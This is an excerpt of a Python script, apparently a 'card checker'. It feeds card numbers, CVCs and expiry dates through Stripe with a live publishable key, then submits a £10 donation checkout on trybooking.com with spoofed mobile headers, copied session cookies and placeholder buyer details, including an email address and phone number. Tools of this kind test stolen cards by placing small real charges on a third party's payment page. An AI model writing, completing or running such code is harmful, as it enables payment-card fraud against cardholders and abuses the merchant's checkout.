...
def Tele5(ccx):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        ...
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2Fee4145ae1a%3B+stripe-js-v3%2Fee4145ae1a%3B+split-card-element&referrer=https%3A%2F%2Fwww.trybooking.com&time_on_page={time_on_page}&key=pk_live_WxI1YGSG4xsX8ViDNgxevxwv'
        ...
        cookies = {
    'TryBooking_VXJsUmVmZXJyZXI': 'www.google.com_RefEventId%3D44248',
    'TryBooking_zrMvQyZf6xF8xrqd_UK': 'bc6edd64-0659-4257-847a-d9f9661b9c1c',
    '__stripe_mid': 'd303dc78-37d4-4868-93d3-710a57f4fbf1d2bc3b',
    '__stripe_sid': '3006de15-42fd-4254-9f17-abd98925645bd1dd4d',
}

        headers = {
    'authority': 'www.trybooking.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://www.trybooking.com',
    'referer': 'https://www.trybooking.com/uk/event/checkout?eid=44248&ses=278394&sec=85464&',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    ...
    'hasPermissionToContact': False,
    'trackingTag': '',
    'customId': '',
    'isStripePaymentIntentBooking': True,
    'recaptchaToken': '',
    'cardBrand': 'Visa',
    'cardSource': 'src_1QBfazBaEv2VOwPOxWIJxGuI',
    'cardCountry': 'US',
    'UserDetails': {
        'firstName': 'thu',
        'lastName': 'ra',
        'emailAddress': 'tyikyi2552002@gmail.com',
        'phoneNumber': '18172388000',
        'address': 'Street',
        'address2': '',
        'postCode': '10080',
        'state': 'NY',
    ...
    'tickets': [
        {
            'AccountId': 3212,
            'EventId': 44248,
            'SessionTimeId': 278394,
            'SectionId': 85464,
            'Quantity': 1,
            'AppliedDiscounts': [],
            'AppliedGiftCertificates': [],
            'AppliedGCOnUnitPrice': 0,
            'AppliedGCOnTryBookingFee': 0,
            'BookingFee': 0,
            'TicketType': {
                'Id': 137651,
                'Name': 'Donation- £10',
    ...
    'https://www.trybooking.com/uk/event/checkout/processpayment',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
        data = response.json()
        client_secret =     data['paymentIntentClientSecret']
        pi = client_secret
